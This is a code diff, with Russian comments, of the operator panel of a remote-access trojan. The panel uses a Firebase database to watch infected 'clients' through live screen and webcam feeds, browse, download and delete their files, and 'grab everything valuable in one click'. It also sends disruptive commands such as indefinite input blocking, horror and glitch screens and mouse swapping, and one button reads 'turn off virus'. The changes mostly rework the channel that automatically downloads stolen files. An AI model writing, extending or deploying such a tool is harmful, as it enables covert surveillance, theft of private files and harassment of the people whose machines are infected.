@@ -75,14 +75,8 @@
       padding: 10px;
       margin: 5px 0;
     }
-    .nav-tabs .nav-link {
-      color: #ccc;
-    }
-    .nav-tabs .nav-link.active {
-      background: #1a1a1a;
-      border-color: #333;
-      color: #fff;
-    }
+    .nav-tabs .nav-link { color: #ccc; }
+    .nav-tabs .nav-link.active { background: #1a1a1a; border-color: #333; color: #fff; }
     .grab-btn {
       font-size: 1.2rem;
       padding: 0.6rem 1.5rem;
@@ -91,13 +85,12 @@
 </head>
 <body>
 <div class="d-flex">
-  <!-- Сайдбар со списком клиентов -->
+  <!-- Сайдбар -->
   <div class="sidebar">
     <h4 class="text-success"><i class="bi bi-pc-display"></i> Клиенты</h4>
     <div id="clientList"></div>
     <div class="mt-2 small" id="connectionStatus"></div>
   </div>
-
   <!-- Основная панель -->
   <div class="flex-grow-1 p-3">
     <div id="mainContent">
@@ -125,9 +118,8 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// Состояние
 let currentClient = null;
-let screenUnsub = null, webcamUnsub = null, fileListUnsub = null, fileTransferUnsub = null;
+let screenUnsub = null, webcamUnsub = null, fileListUnsub = null, transferUnsub = null;
 let clientsData = {};
 let clientElements = {};
 let currentPath = "C:\\";
@@ -186,11 +178,10 @@ function selectClient(id) {
     currentClient = id;
     if (clientElements[id]) clientElements[id].classList.add('active');
 
-    // Отписка от старых слушателей
     if (screenUnsub) { screenUnsub(); screenUnsub = null; }
     if (webcamUnsub) { webcamUnsub(); webcamUnsub = null; }
     if (fileListUnsub) { fileListUnsub(); fileListUnsub = null; }
-    if (fileTransferUnsub) { fileTransferUnsub(); fileTransferUnsub = null; }
+    if (transferUnsub) { transferUnsub(); transferUnsub = null; }
 
     renderPanel(id);
 
@@ -200,16 +191,10 @@ function selectClient(id) {
         if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
     });
 
-    // Веб-камера (если есть)
+    // Веб-камера (если будет)
     webcamUnsub = onValue(ref(db, `clients/${id}/webcam`), (snap) => {
         const img = document.getElementById('webcamImg');
         if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
-    });
-
-    // Результат действий с файлами
-    onValue(ref(db, `clients/${id}/file_action_result`), (snap) => {
-        const val = snap.val();
-        if (val) addLog(`[FileAction] ${val}`);
     });
 
     // Статус граббера
@@ -221,8 +206,14 @@ function selectClient(id) {
         }
     });
 
-    // Скачанные файлы
-    fileTransferUnsub = onValue(ref(db, `clients/${id}/file_transfer`), (snap) => {
+    // Ошибки передачи файлов
+    onValue(ref(db, `clients/${id}/transfer_error`), (snap) => {
+        const err = snap.val();
+        if (err) addLog(`[Transfer Error] ${err}`);
+    });
+
+    // Автоматическое скачивание файлов из transfer
+    transferUnsub = onValue(ref(db, `clients/${id}/transfer`), (snap) => {
         const val = snap.val();
         if (val && val.data) {
             addLog(`[Download] Получен файл: ${val.name}`);
@@ -230,11 +221,12 @@ function selectClient(id) {
             link.href = `data:application/octet-stream;base64,${val.data}`;
             link.download = val.name;
             link.click();
-            set(ref(db, `clients/${id}/file_transfer`), null);
+            // очищаем transfer
+            set(ref(db, `clients/${id}/transfer`), null);
         }
     });
 
-    // Запросить список файлов корня C:\
+    // Первый запрос списка файлов
     requestFileList('C:\\');
 }
 
@@ -245,7 +237,7 @@ function addLog(msg) {
     log.scrollTop = log.scrollHeight;
 }
 
-// ========== Пресеты (7 слотов) ==========
+// ========== Пресеты ==========
 const PRESETS_KEY = 'remoteControlPresets_v6';
 function loadPresets() {
     try {
@@ -254,7 +246,7 @@ function loadPresets() {
 }
 function savePresets(presets) { localStorage.setItem(PRESETS_KEY, JSON.stringify(presets)); }
 
-// ========== Рендер основной панели ==========
+// ========== Рендер панели ==========
 function renderPanel(id) {
     const main = document.getElementById('mainContent');
     const presets = loadPresets();
@@ -326,29 +318,28 @@ function renderPanel(id) {
 
                 <!-- Команды -->
                 <div class="mt-3">
-                    <h5>Команды <small class="text-muted">(секунды в поле, если пусто – по умолчанию)</small></h5>
-                    <div class="d-flex flex-wrap gap-2">
+                    <h5>Команды <small class="text-muted">(время в секундах, 0 = по умолчанию)</small></h5>
+                    <div class="d-flex flex-wrap gap-2 mb-2">
                         <button class="btn btn-outline-warning btn-hacker" onclick="sendCmd('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
                         <button class="btn btn-outline-info" onclick="sendCmd('screenshot')"><i class="bi bi-camera"></i> Скриншот</button>
                         <button class="btn btn-outline-danger" onclick="sendCmd('self_destruct')"><i class="bi bi-skull"></i> ВЫКЛЮЧИТЬ ВИРУС</button>
-                        <button class="btn btn-danger grab-btn" onclick="grabPrecious()"><i class="bi bi-archive"></i> Собрать всё ценное</button>
                     </div>
 
-                    <div class="row mt-3 g-2">
+                    <div class="row g-2">
                         <!-- Horror -->
                         <div class="col-md-6">
                             <div class="input-group">
-                                <span class="input-group-text bg-dark text-success">Horror</span>
+                                <span class="input-group-text bg-dark text-success">Хоррор</span>
                                 <input type="number" class="form-control input-duration" id="dur_horror" placeholder="5" min="1" value="5">
-                                <button class="btn btn-outline-danger" onclick="sendCmdWithDuration('horror', 'dur_horror')"><i class="bi bi-emoji-dizzy"></i> Запустить</button>
+                                <button class="btn btn-outline-danger" onclick="sendWithDuration('horror', 'dur_horror')">Запустить</button>
                             </div>
                         </div>
-                        <!-- Recursive Glitch -->
+                        <!-- Glitch Recursive -->
                         <div class="col-md-6">
                             <div class="input-group">
-                                <span class="input-group-text bg-dark text-warning">Glitch</span>
+                                <span class="input-group-text bg-dark text-warning">Глитч</span>
                                 <input type="number" class="form-control input-duration" id="dur_glitch" placeholder="5" min="1" value="5">
-                                <button class="btn btn-outline-warning" onclick="sendCmdWithDuration('glitch', 'dur_glitch')"><i class="bi bi-bug"></i> Запустить</button>
+                                <button class="btn btn-outline-warning" onclick="sendWithDuration('glitch', 'dur_glitch')">Запустить</button>
                             </div>
                         </div>
                         <!-- Cursor Trails -->
@@ -356,7 +347,7 @@ function renderPanel(id) {
                             <div class="input-group">
                                 <span class="input-group-text bg-dark text-light">Крестики</span>
                                 <input type="number" class="form-control input-duration" id="dur_crosses" placeholder="5" min="1" value="5">
-                                <button class="btn btn-outline-light" onclick="sendCmdWithDuration('crosses', 'dur_crosses')"><i class="bi bi-x-lg"></i> Запустить</button>
+                                <button class="btn btn-outline-light" onclick="sendWithDuration('crosses', 'dur_crosses')">Запустить</button>
                             </div>
                         </div>
                         <!-- Crazy Mouse -->
@@ -364,7 +355,7 @@ function renderPanel(id) {
                             <div class="input-group">
                                 <span class="input-group-text bg-dark text-info">Мышь</span>
                                 <input type="number" class="form-control input-duration" id="dur_crazy" placeholder="10" min="1" value="10">
-                                <button class="btn btn-outline-info" onclick="sendCmdWithDuration('crazy_mouse', 'dur_crazy')"><i class="bi bi-mouse"></i> Бешеная мышь</button>
+                                <button class="btn btn-outline-info" onclick="sendWithDuration('crazy_mouse', 'dur_crazy')">Запустить</button>
                             </div>
                         </div>
                         <!-- Block Input -->
@@ -372,7 +363,7 @@ function renderPanel(id) {
                             <div class="input-group">
                                 <span class="input-group-text bg-dark text-danger">Блокировка</span>
                                 <input type="number" class="form-control input-duration" id="dur_block" placeholder="0=бесконечно" min="0" value="0">
-                                <button class="btn btn-outline-danger" onclick="sendBlockInput()"><i class="bi bi-lock"></i> Блокировать</button>
+                                <button class="btn btn-outline-danger" onclick="sendBlockInput()">Блокировать</button>
                             </div>
                         </div>
                         <!-- Disco -->
@@ -380,7 +371,7 @@ function renderPanel(id) {
                             <div class="input-group">
                                 <span class="input-group-text bg-dark text-warning">Диско</span>
                                 <input type="number" class="form-control input-duration" id="dur_disco" placeholder="10" min="1" value="10">
-                                <button class="btn btn-outline-warning" onclick="sendCmdWithDuration('disco', 'dur_disco')"><i class="bi bi-boombox"></i> Запустить</button>
+                                <button class="btn btn-outline-warning" onclick="sendWithDuration('disco', 'dur_disco')">Запустить</button>
                             </div>
                         </div>
                         <!-- Swap Mouse -->
@@ -388,7 +379,7 @@ function renderPanel(id) {
                             <div class="input-group">
                                 <span class="input-group-text bg-dark text-light">Swap мыши</span>
                                 <input type="number" class="form-control input-duration" id="dur_swap" placeholder="30" min="1" value="30">
-                                <button class="btn btn-outline-light" onclick="sendCmdWithDuration('swap_mouse', 'dur_swap')"><i class="bi bi-arrow-left-right"></i> Запустить</button>
+                                <button class="btn btn-outline-light" onclick="sendWithDuration('swap_mouse', 'dur_swap')">Запустить</button>
                             </div>
                         </div>
                         <!-- Open Calc -->
@@ -396,12 +387,12 @@ function renderPanel(id) {
                             <div class="input-group">
                                 <span class="input-group-text bg-dark text-primary">Calc</span>
                                 <input type="number" class="form-control input-duration" id="dur_calc" placeholder="10" min="1" value="10">
-                                <button class="btn btn-outline-primary" onclick="sendCmdWithDuration('open_calc', 'dur_calc')"><i class="bi bi-calculator"></i> Запустить</button>
+                                <button class="btn btn-outline-primary" onclick="sendWithDuration('open_calc', 'dur_calc')">Запустить</button>
                             </div>
                         </div>
                     </div>
 
-                    <!-- Прочие команды -->
+                    <!-- Другие команды -->
                     <div class="input-group mt-2">
                         <input type="text" id="msgText" class="form-control" placeholder="Текст сообщения">
                         <button class="btn btn-outline-success" onclick="sendMsg()"><i class="bi bi-send"></i> Сообщение</button>
@@ -432,9 +423,7 @@ function renderPanel(id) {
             <div class="tab-pane fade" id="files" role="tabpanel">
                 <div class="d-flex justify-content-between align-items-center mb-2">
                     <h5>📁 Текущий путь: <span id="currentPathDisplay">${currentPath}</span></h5>
-                    <div>
-                        <button class="btn btn-danger btn-lg me-2" onclick="grabPrecious()">🛡 Скачать всё ценное в 1 клик</button>
-                    </div>
+                    <button class="btn btn-danger btn-lg" onclick="grabPrecious()">🛡 Скачать всё ценное в 1 клик</button>
                 </div>
                 <div id="grabStatus" class="text-warning mb-2"></div>
                 <table class="table table-dark table-hover">
@@ -456,7 +445,7 @@ function renderPanel(id) {
         </div>
     `;
 
-    // Обработчики пресетов
+    // Привязка событий пресетов
     document.querySelectorAll('.preset-name, .preset-cmd, .preset-payload').forEach(el => {
         el.addEventListener('input', () => updatePreset(el.dataset.index));
     });
@@ -464,7 +453,7 @@ function renderPanel(id) {
         btn.addEventListener('click', () => runPreset(btn.dataset.index));
     });
 
-    // Активация табов (Bootstrap)
+    // Табы
     document.querySelectorAll('#mainTabs button').forEach(tab => {
         tab.addEventListener('click', function(e) {
             e.preventDefault();
@@ -476,7 +465,7 @@ function renderPanel(id) {
         });
     });
 
-    // Подписка на file_list
+    // Слушатель file_list
     if (fileListUnsub) fileListUnsub();
     fileListUnsub = onValue(ref(db, `clients/${currentClient}/file_list`), (snap) => {
         const val = snap.val();
@@ -495,7 +484,6 @@ function renderPanel(id) {
     });
 }
 
-// ========== Файловый менеджер (таблица) ==========
 function populateFileTable(items) {
     const tbody = document.getElementById('fileTableBody');
     if (!tbody) return;
@@ -542,7 +530,7 @@ function goUpFolder() {
 function downloadFile(name) {
     const filePath = currentPath + '\\' + name;
     sendCmd('file_action', JSON.stringify({ action: 'download', target: filePath }));
-    addLog(`Запрос на скачивание: ${name}`);
+    addLog(`Запрос на скачивание: ${name}. Ожидание файла от клиента...`);
 }
 
 function deleteItem(name) {
@@ -576,7 +564,7 @@ window.sendCmd = function(cmd, payload = '') {
     update(ref(db), updates).then(() => addLog(`Отправлено: ${cmd}${payload ? ' ('+payload+')' : ''}`)).catch(console.error);
 };
 
-window.sendCmdWithDuration = function(cmd, inputId) {
+window.sendWithDuration = function(cmd, inputId) {
     const input = document.getElementById(inputId);
     const val = input ? input.value.trim() : '';
     sendCmd(cmd, val);
@@ -586,9 +574,9 @@ window.sendBlockInput = function() {
     const input = document.getElementById('dur_block');
     const val = input ? input.value.trim() : '';
     if (val === '' || val === '0') {
-        sendCmd('block_input', 'true'); // бесконечно
+        sendCmd('block_input', 'true');
     } else {
-        sendCmd('block_input', val); // временная блокировка на val секунд
+        sendCmd('block_input', val);
     }
 };
 
